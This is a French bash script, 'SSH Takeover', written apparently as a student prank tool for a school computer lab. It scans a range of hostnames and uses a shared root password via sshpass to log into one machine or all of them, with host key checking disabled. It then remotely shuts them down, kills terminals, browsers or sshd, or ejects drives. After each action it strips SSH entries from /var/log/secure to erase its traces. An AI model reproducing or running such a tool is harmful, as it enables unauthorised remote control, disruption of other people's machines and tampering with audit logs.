#!/bin/bash
#SSH Takeover tool, utilisez-le pour apprendre seulement, PAS pour embêter le monde!
#Développé dans une optique d'apprentissage du bash, des commandes linux et du ssh
#Merci aux cours d'OS et de réseau

#Je ne suis pas responsable si vous vous faites virer de cours, ni de l'utilisation que vous pouvez faire de ce script
#Avec "service sshd stop" ce script ne sert plus à rien.

$activated = 1
reset
service sshd start

menu()
{
echo -e "\033[31;1;4;5;7mQue voulez-vous faire?\033[0m"
echo -e "\033[0;02m1. Attaquer un poste par hostname\033[0;02m"
echo -e "\033[0;02m2. Recherche des postes en ligne\033[0;02m"
echo -e "\033[0;02m3. Attaquer tous les postes connectés (il faut rechercher avant)\033[0;02m"
echo -e "\033[0;02m4. Afficher les postes connectés\033[0;02m"
echo -e "\033[0;02m5. Déconnecter les clients connectés sur ce PC et protéger le PC\033[0;02m"
echo -e "\033[0;02m6. Quitter\033[0;02m"
read choix
}

menu2()
{
echo -e "\033[31;1;4;5;7mQue voulez-vous faire sur $hostname_target?\033[0m"
echo -e "\033[0;02m1. Eteindre l'ordinateur\033[0;02m"
echo -e "\033[0;02m2. Fermer les terminaux\033[0;02m"
echo -e "\033[0;02m3. Fermer les navigateurs\033[0;02m"
echo -e "\033[0;02m4. Ouvrir le lecteur cd (instable)\033[0;02m"
echo -e "\033[0;02m5. Déconnecter les clients connectés sur ce PC et protéger le PC\033[0;02m"
echo -e "\033[0;02m6. Menu principal\033[0;02m"
read choix2
}

menu3()
{
echo -e "\033[31;1;4;5;7mQue voulez-vous faire sur tous les postes connectés?\033[0m"
echo -e "\033[0;02m1. Eteindre l'ordinateur\033[0;02m"
echo -e "\033[0;02m2. Fermer les terminaux\033[0;02m"
echo -e "\033[0;02m3. Fermer les navigateurs\033[0;02m"
echo -e "\033[0;02m4. Ouvrir le lecteur cd (instable)\033[0;02m"
echo -e "\033[0;02m5. Déconnecter les clients connectés sur le PC et protéger le PC\033[0;02m"
echo -e "\033[0;02m6. Menu principal\033[0;02m"
read choix3
}

if [[ $EUID -ne 0 ]]; then
   echo "Ce script doit être exécuté en tant que root!" 
   exit 1
fi

if which sshpass >/dev/null; then
    echo "sshpass est installé"
else
    echo "sshpass n'est pas installé, installation en cours.."
    yum install sshpass
fi

echo "Entrez le mot de passe root:"
read password
reset
while $activated
do

menu

if [ $choix == 1 ]
then
clear
echo "Quel hostname voulez-vous attaquer?"
read hostname_target
choix2=0

	while [ "$choix2" -ne "6" ]
	do
	menu2
	echo $choix2
	if [ $choix2 == 1 ]
	then
	echo "Connection à" $hostname_target "en cours..."
	sshpass -p$password ssh -o StrictHostKeyChecking=no root@$hostname_target shutdown -h 0 && cd /var/log && grep -v "ssh" secure > temp && \mv temp secure
	clear
	echo "Commande effectuée."

	elif [ $choix2 == 2 ]
	then
	echo "Connection à" $hostname_target "en cours..."
	sshpass -p$password ssh -o StrictHostKeyChecking=no root@$hostname_target killall terminal gnome-terminal && cd /var/log && grep -v "ssh" secure > temp && \mv temp secure
	clear
	echo "Commande effectuée."

	elif [ $choix2 == 3 ]
	then
	echo "Connection à" $hostname_target "en cours..."
	sshpass -p$password ssh -o StrictHostKeyChecking=no root@$hostname_target killall firefox && cd /var/log && grep -v "ssh" secure > temp && \mv temp secure
	clear
	echo "Commande effectuée."

	elif [ $choix2 == 4 ]
	then
	echo "Connection à" $hostname_target "en cours..."
	sshpass -p$password ssh -o StrictHostKeyChecking=no root@$hostname_target eject && cd /var/log && grep -v "ssh" secure > temp && \mv temp secure
	clear
	echo "Commande effectuée."

	elif [ $choix2 == 5 ]
	then
	echo "Connection à" $hostname_target "en cours..."
	sshpass -p$password ssh -o StrictHostKeyChecking=no root@$hostname_target killall -9 sshd && cd /var/log && grep -v "ssh" secure > temp && \mv temp secure
	clear
	echo "Commande effectuée."

	elif [ $choix2 == 6 ]
	then
	reset
	echo "Retour au menu.."
	
	else
	clear
	fi

	done





elif [ $choix == 2 ]
then
clear
echo "Le script va détecter les ordinateurs en ligne..."
echo "Entrez le début de la plage d'hôtes à détecter:"
read host_start
echo "Entrez la fin de la plage d'hôtes à détecter:"
read host_end
tab_index=0
while test $host_start != $host_end
    do 
    ping -q -c3 dinfo"$host_start"
	
    if [ $? -eq 0 ]
	then
	hosts[$tab_index]=dinfo"$host_start"
	tab_index=$(($tab_index + 1))
	
    fi
    

    host_start=$(($host_start + 1))
done
clear
echo "Les postes connectés dans la plage donnée sont:"
for i in ${hosts[*]};do echo $i;done



elif [ $choix == 3 ]
then
clear
choix3=0

	while [ "$choix3" -ne "6" ]
	do
	menu3
	if [ $choix3 == 1 ]
	then
	echo "Attaque en cours..."
	for i in ${hosts[*]}; do sshpass -p$password ssh -o StrictHostKeyChecking=no root@$i shutdown -h 0 && cd /var/log && grep -v "ssh" secure > temp && \mv temp secure;done
	clear
	echo "Commande effectuée."

	elif [ $choix3 == 2 ]
	then
	echo "Attaque en cours..."
	for i in ${hosts[*]}; do sshpass -p$password ssh -o StrictHostKeyChecking=no root@$i killall terminal gnome-terminal && cd /var/log && grep -v "ssh" secure > temp && \mv temp secure;done
	clear
	echo "Commande effectuée."

	elif [ $choix3 == 3 ]
	then
	echo "Attaque en cours..."
	for i in ${hosts[*]}; do sshpass -p$password ssh -o StrictHostKeyChecking=no root@$i killall firefox && cd /var/log && grep -v "ssh" secure > temp && \mv temp secure;done
	clear
	echo "Commande effectuée."

	elif [ $choix3 == 4 ]
	then
	echo "Attaque en cours..."
	for i in ${hosts[*]}; do sshpass -p$password ssh -o StrictHostKeyChecking=no root@$i eject && cd /var/log && grep -v "ssh" secure > temp && \mv temp secure;done
	clear
	echo "Commande effectuée."

	elif [ $choix3 == 5 ]
	then
	echo "Attaque en cours..."
	for i in ${hosts[*]}; do sshpass -p$password ssh -o StrictHostKeyChecking=no root@$i killall -9 sshd && cd /var/log && grep -v "ssh" secure > temp && \mv temp secure;done
	clear
	echo "Commande effectuée."

	elif [ $choix3 == 6 ]
	then
	reset
	echo "Retour au menu.."
	
	else
	clear
	fi

	done




elif [ $choix == 4 ]
then
clear
echo "Les postes connectés dans la plage donnée sont:"
for i in ${hosts[*]};do echo $i;done


elif [ $choix == 5 ]
then
clear
killall -9 sshd && cd /var/log && grep -v "ssh" secure > temp && \mv temp secure
echo "PC Protégé et clients déconnectés"

elif [ $choix == 6 ]
then
clear
echo "Merci d'utiliser ssh_takeover, à bientôt!"
cd /var/log && grep -v "ssh" secure > temp && \mv temp secure
service sshd stop
reset
exit 1

else
clear
fi

done










